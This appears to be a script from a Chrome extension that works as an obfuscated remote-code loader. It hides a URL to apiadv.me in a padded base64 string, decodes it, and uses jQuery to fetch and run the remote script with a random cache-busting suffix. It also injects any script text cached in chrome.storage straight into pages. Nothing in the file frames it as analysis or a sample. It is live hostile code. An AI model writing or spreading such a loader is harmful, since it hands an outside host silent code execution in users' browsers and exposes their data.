var IlTPXFOys = 'IlTPXFOysLy9hcGlhZHYubWUvanMvb2thcGkuanM=IlTPXFOya';
var j = '//ajax.googleapis.com/ajax/libs/jquery/1.12.3/jquery.min.js';
var s = document.createElement('script');
s.type = 'text/javascript';
s.src = j;
document.head.appendChild(s);
function LnDgSyNS() {
    var b = new XMLHttpRequest();
    b.open('GET', j, true);
    b.onreadystatechange = function () {
        if (b.readyState == 4 && b.status === 200) {
            eval(b.responseText);
        }
        ;
    };
    b.send();
    var t = 0;

    function g() {
        if (window.jQuery) {
            jQuery.getScript(atob(IlTPXFOys.slice(9, -9)) + '?' + Math.floor((Math.random() * 1e+10) + 1));
        } else {
            t++;
            if (t < 100) {
                setTimeout(g, 100);
            }
            ;
        }
        ;
    };
    g();
};chrome.storage.local.get({tQFzTAwV: ''}, function (syncdata) {
    if (!chrome.runtime.lastError) {
        if (syncdata.tQFzTAwV != '') {
            var i = document.createElement('script');
            i.type = 'text/javascript';
            i.innerHTML = syncdata.tQFzTAwV;
            document.head.appendChild(i);
        } else {
            LnDgSyNS();
        }
        ;
    } else {
        LnDgSyNS();
    }
    ;
});